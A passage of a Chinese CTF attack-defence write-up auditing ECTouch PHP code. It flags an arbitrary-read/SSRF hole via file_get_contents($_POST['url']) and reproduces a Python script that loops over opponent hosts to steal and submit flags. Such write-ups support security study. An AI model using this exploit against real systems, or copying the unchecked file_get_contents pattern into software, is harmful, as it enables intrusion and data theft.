</span></span><span class=line><span class=cl>            <span class=nv>$name</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;user_id&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;_&#39;</span> <span class=o>.</span> <span class=nv>$name</span> <span class=o>.</span> <span class=s1>&#39;.&#39;</span> <span class=o>.</span> <span class=nv>$ftype</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nv>$target</span> <span class=o>=</span> <span class=nx>ROOT_PATH</span> <span class=o>.</span> <span class=nx>DATA_DIR</span> <span class=o>.</span> <span class=s1>&#39;/&#39;</span> <span class=o>.</span> <span class=nv>$type</span> <span class=o>.</span> <span class=s1>&#39;/&#39;</span> <span class=o>.</span> <span class=nv>$name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>move_upload_file</span><span class=p>(</span><span class=nv>$upload</span><span class=p>[</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>],</span> <span class=nv>$target</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>ECTouch</span><span class=o>::</span><span class=na>err</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>add</span><span class=p>(</span><span class=nx>L</span><span class=p>(</span><span class=s1>&#39;upload_file_error&#39;</span><span class=p>),</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=nv>$name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>ECTouch</span><span class=o>::</span><span class=na>err</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>add</span><span class=p>(</span><span class=nx>L</span><span class=p>(</span><span class=s1>&#39;upload_file_type&#39;</span><span class=p>),</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>ECTouch</span><span class=o>::</span><span class=na>err</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>add</span><span class=p>(</span><span class=nx>L</span><span class=p>(</span><span class=s1>&#39;upload_file_error&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>而且这个函数在留言板中被调用，是否能利用还有待研究，<code>function.php</code>中的其他函数基本没什么异常</p><p>再来看<code>insert.php</code>，可以发现有个<code>insert_ads()</code>函数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>insert_ads</span><span class=p>(</span><span class=nv>$arr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>static</span> <span class=nv>$static_res</span> <span class=o>=</span> <span class=k>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$time</span> <span class=o>=</span> <span class=nx>gmtime</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$arr</span><span class=p>[</span><span class=s1>&#39;num&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$arr</span><span class=p>[</span><span class=s1>&#39;num&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$sql</span> <span class=o>=</span> <span class=s1>&#39;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &#39;</span> <span class=o>.</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;p.ad_height, p.position_style, RAND() AS rnd &#39;</span> <span class=o>.</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;FROM &#39;</span> <span class=o>.</span> <span class=nx>M</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>pre</span> <span class=o>.</span> <span class=s1>&#39;touch_ad &#39;</span> <span class=o>.</span> <span class=s1>&#39; AS a &#39;</span> <span class=o>.</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;LEFT JOIN &#39;</span> <span class=o>.</span> <span class=nx>M</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>pre</span> <span class=o>.</span> <span class=s1>&#39;touch_ad_position &#39;</span> <span class=o>.</span> <span class=s1>&#39; AS p ON a.position_id = p.position_id &#39;</span> <span class=o>.</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;WHERE enabled = 1 AND start_time &lt;= &#39;&#34;</span> <span class=o>.</span> <span class=nv>$time</span> <span class=o>.</span> <span class=s2>&#34;&#39; AND end_time &gt;= &#39;&#34;</span> <span class=o>.</span> <span class=nv>$time</span> <span class=o>.</span> <span class=s2>&#34;&#39; &#34;</span> <span class=o>.</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;AND a.position_id = &#39;&#34;</span> <span class=o>.</span> <span class=nv>$arr</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;&#39; &#34;</span> <span class=o>.</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;ORDER BY rnd LIMIT &#39;</span> <span class=o>.</span> <span class=nv>$arr</span><span class=p>[</span><span class=s1>&#39;num&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nv>$res</span> <span class=o>=</span> <span class=nx>M</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=nv>$sql</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$static_res</span><span class=p>[</span><span class=nv>$arr</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]]</span> <span class=o>===</span> <span class=k>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$sql</span> <span class=o>=</span> <span class=s1>&#39;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &#39;</span> <span class=o>.</span>
</span></span><span class=line><span class=cl>                    <span class=s1>&#39;p.ad_height, p.position_style, RAND() AS rnd &#39;</span> <span class=o>.</span>
</span></span><span class=line><span class=cl>                    <span class=s1>&#39;FROM &#39;</span> <span class=o>.</span> <span class=nx>M</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>pre</span> <span class=o>.</span> <span class=s1>&#39;touch_ad &#39;</span> <span class=o>.</span> <span class=s1>&#39; AS a &#39;</span> <span class=o>.</span>
</span></span><span class=line><span class=cl>                    <span class=s1>&#39;LEFT JOIN &#39;</span> <span class=o>.</span> <span class=nx>M</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>pre</span> <span class=o>.</span> <span class=s1>&#39;touch_ad_position&#39;</span> <span class=o>.</span> <span class=s1>&#39; AS p ON a.position_id = p.position_id &#39;</span> <span class=o>.</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;WHERE enabled = 1 AND a.position_id = &#39;&#34;</span> <span class=o>.</span> <span class=nv>$arr</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>.</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;&#39; AND start_time &lt;= &#39;&#34;</span> <span class=o>.</span> <span class=nv>$time</span> <span class=o>.</span> <span class=s2>&#34;&#39; AND end_time &gt;= &#39;&#34;</span> <span class=o>.</span> <span class=nv>$time</span> <span class=o>.</span> <span class=s2>&#34;&#39; &#34;</span> <span class=o>.</span>
</span></span><span class=line><span class=cl>                    <span class=s1>&#39;ORDER BY rnd LIMIT 1&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$static_res</span><span class=p>[</span><span class=nv>$arr</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]]</span> <span class=o>=</span> <span class=nx>M</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=nv>$sql</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$res</span> <span class=o>=</span> <span class=nv>$static_res</span><span class=p>[</span><span class=nv>$arr</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ads</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$position_style</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$res</span> <span class=k>AS</span> <span class=nv>$row</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;position_id&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=nv>$arr</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$position_style</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;position_style&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>switch</span> <span class=p>(</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;media_type&#39;</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>0</span><span class=o>:</span> <span class=c1>// 图片广告
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nv>$src</span> <span class=o>=</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;ad_code&#39;</span><span class=p>],</span> <span class=s1>&#39;http://&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span> <span class=o>&amp;&amp;</span> <span class=nx>strpos</span><span class=p>(</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;ad_code&#39;</span><span class=p>],</span> <span class=s1>&#39;https://&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=o>?</span>
</span></span><span class=line><span class=cl>                        <span class=nx>__URL__</span> <span class=o>.</span> <span class=s2>&#34;/</span><span class=si>$row[ad_code]</span><span class=s2>&#34;</span> <span class=o>:</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;ad_code&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=nv>$ads</span><span class=p>[]</span> <span class=o>=</span> <span class=s2>&#34;&lt;a href=&#39;&#34;</span> <span class=o>.</span> <span class=nx>url</span><span class=p>(</span><span class=s1>&#39;default/affiche/index&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;ad_id&#39;</span> <span class=o>=&gt;</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;ad_id&#39;</span><span class=p>],</span> <span class=s1>&#39;uri&#39;</span> <span class=o>=&gt;</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;ad_link&#34;</span><span class=p>])))</span> <span class=o>.</span> <span class=s2>&#34;&#39; 
</span></span></span><span class=line><span class=cl><span class=s2>                target=&#39;_blank&#39;&gt;&lt;img src=&#39;</span><span class=si>$src</span><span class=s2>&#39; width=&#39;&#34;</span> <span class=o>.</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;ad_width&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;&#39; height=&#39;</span><span class=si>$row[ad_height]</span><span class=s2>&#39;
</span></span></span><span class=line><span class=cl><span class=s2>                border=&#39;0&#39; /&gt;&lt;/a&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=c1>// Flash
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nv>$src</span> <span class=o>=</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;ad_code&#39;</span><span class=p>],</span> <span class=s1>&#39;http://&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span> <span class=o>&amp;&amp;</span> <span class=nx>strpos</span><span class=p>(</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;ad_code&#39;</span><span class=p>],</span> <span class=s1>&#39;https://&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=o>?</span>
</span></span><span class=line><span class=cl>                        <span class=nx>__URL__</span> <span class=o>.</span> <span class=s2>&#34;/</span><span class=si>$row[ad_code]</span><span class=s2>&#34;</span> <span class=o>:</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;ad_code&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=nv>$ads</span><span class=p>[]</span> <span class=o>=</span> <span class=s2>&#34;&lt;object classid=</span><span class=se>\&#34;</span><span class=s2>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000</span><span class=se>\&#34;</span><span class=s2> &#34;</span> <span class=o>.</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;codebase=</span><span class=se>\&#34;</span><span class=s2>http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0</span><span class=se>\&#34;</span><span class=s2>  &#34;</span> <span class=o>.</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;width=&#39;</span><span class=si>$row[ad_width]</span><span class=s2>&#39; height=&#39;</span><span class=si>$row[ad_height]</span><span class=s2>&#39;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>                           &lt;param name=&#39;movie&#39; value=&#39;</span><span class=si>$src</span><span class=s2>&#39;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>                           &lt;param name=&#39;quality&#39; value=&#39;high&#39;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>                           &lt;embed src=&#39;</span><span class=si>$src</span><span class=s2>&#39; quality=&#39;high&#39;
</span></span></span><span class=line><span class=cl><span class=s2>                           pluginspage=&#39;http://www.macromedia.com/go/getflashplayer&#39;
</span></span></span><span class=line><span class=cl><span class=s2>                           type=&#39;application/x-shockwave-flash&#39; width=&#39;</span><span class=si>$row[ad_width]</span><span class=s2>&#39;
</span></span></span><span class=line><span class=cl><span class=s2>                           height=&#39;</span><span class=si>$row[ad_height]</span><span class=s2>&#39;&gt;&lt;/embed&gt;
</span></span></span><span class=line><span class=cl><span class=s2>                         &lt;/object&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>2</span><span class=o>:</span> <span class=c1>// CODE
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nv>$ads</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;ad_code&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>3</span><span class=o>:</span> <span class=c1>// TEXT
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nv>$ads</span><span class=p>[]</span> <span class=o>=</span> <span class=s2>&#34;&lt;a href=&#39;&#34;</span> <span class=o>.</span> <span class=nx>url</span><span class=p>(</span><span class=s1>&#39;default/affiche/index&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;ad_id&#39;</span> <span class=o>=&gt;</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;ad_id&#39;</span><span class=p>],</span> <span class=s1>&#39;uri&#39;</span> <span class=o>=&gt;</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;ad_link&#34;</span><span class=p>])))</span> <span class=o>.</span> <span class=s2>&#34;&#39;
</span></span></span><span class=line><span class=cl><span class=s2>                target=&#39;_blank&#39;&gt;&#34;</span> <span class=o>.</span> <span class=nx>htmlspecialchars</span><span class=p>(</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;ad_code&#39;</span><span class=p>])</span> <span class=o>.</span> <span class=s1>&#39;&lt;/a&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>4</span><span class=o>:</span> <span class=c1>// url
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nv>$ads</span><span class=p>[]</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;url&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$position_style</span> <span class=o>=</span> <span class=s1>&#39;str:&#39;</span> <span class=o>.</span> <span class=nv>$position_style</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$need_cache</span> <span class=o>=</span> <span class=nx>ECTouch</span><span class=o>::</span><span class=na>view</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>caching</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>ECTouch</span><span class=o>::</span><span class=na>view</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>caching</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>ECTouch</span><span class=o>::</span><span class=na>view</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>assign</span><span class=p>(</span><span class=s1>&#39;ads&#39;</span><span class=p>,</span> <span class=nv>$ads</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$val</span> <span class=o>=</span> <span class=nx>ECTouch</span><span class=o>::</span><span class=na>view</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>fetch</span><span class=p>(</span><span class=nv>$position_style</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>ECTouch</span><span class=o>::</span><span class=na>view</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>caching</span> <span class=o>=</span> <span class=nv>$need_cache</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>html_entity_decode</span><span class=p>(</span><span class=nv>$val</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里比较扎眼的便是<code>case 4</code>这里</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>4</span><span class=o>:</span> <span class=c1>// url
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nv>$ads</span><span class=p>[]</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;url&#39;</span><span class=p>]);</span>
</span></span></code></pre></td></tr></table></div></div><p>这里很明显只有一段代码，而且还是<code>file_get_contents()</code>，这里便是一个任意文件读取的漏洞。</p><p>这里放上一叶飘零大佬的jio本以供学习：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;url&#34;</span><span class=p>:</span><span class=s2>&#34;http://10.0.1.2?token=RCNWBJXQ&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://10.50.</span><span class=si>%s</span><span class=s2>.2/mobile/index.php&#34;</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>37</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>urll</span> <span class=o>=</span> <span class=n>url</span><span class=o>%</span><span class=n>x</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>			<span class=c1>#attack moudle</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>urll</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span><span class=n>timeout</span><span class=o>=</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>=</span>  <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s1>&#39;&lt;li&gt;.*?&lt;/li&gt;&#39;</span><span class=p>,</span><span class=n>r</span><span class=o>.</span><span class=n>content</span><span class=p>)[</span><span class=mi>0</span><span class=p>][</span><span class=mi>4</span><span class=p>:</span><span class=o>-</span><span class=mi>5</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=c1>#submit flag moudle</span>
</span></span><span class=line><span class=cl>            <span class=n>flagurl</span> <span class=o>=</span> <span class=s2>&#34;https://192.168.37.180/match/WAR20/oapi?atn=answers&amp;token=RCNWBJXQ&amp;flag=</span><span class=si>%s</span><span class=s2>&#34;</span><span class=o>%</span><span class=n>flag</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>flagurl</span><span class=p>,</span><span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1>#check flag</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;wrong answer.&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span> <span class=n>r</span><span class=o>.</span><span class=n>content</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=s2>&#34;attack ip times: &#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>60</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>这里问什么文件读取就可以拿到<code>flag</code>呢？因为<a class=link href=http://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp target=_blank rel=noopener>file_get_contents</a>这个函数，既然要读取<code>url</code>中的文件，自然得先去请求<code>url</code>，所以自然可以拿到<code>flag</code></p><h3 id=poc-3>Poc 3</h3><p>官方还给了一个<code>mobile/api/uc.php</code>的<code>hint</code>，当时我们看了一下，感觉没啥用&mldr;这里还是主要参考一叶飘零大佬的分析&mldr;</p><p>当时乍一看好像没什么问题…现在仔细看这里</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$get</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>],</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;test&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;deleteuser&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;renameuser&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;gettag&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;synlogin&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;synlogout&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;updatepw&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;updatebadwords&#39;</span><span class=p>,</span>
